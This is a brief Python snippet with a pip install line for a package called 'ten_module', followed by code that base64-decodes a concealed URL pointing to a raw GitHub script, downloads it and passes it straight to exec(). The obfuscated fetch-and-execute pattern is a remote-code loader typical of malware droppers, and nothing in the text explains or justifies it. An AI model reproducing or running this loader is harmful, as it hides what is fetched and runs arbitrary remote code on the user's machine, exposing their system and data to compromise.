python3 -m pip install ten_module

import requests
import base64

url = base64.b64decode(
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3VpYWh1aVVJL1NjcmlwdC9yZWZzL2hlYWRzL21haW4vdWlhb3MucHk="
).decode()

response = requests.get(url)
response.raise_for_status()

exec(response.text)
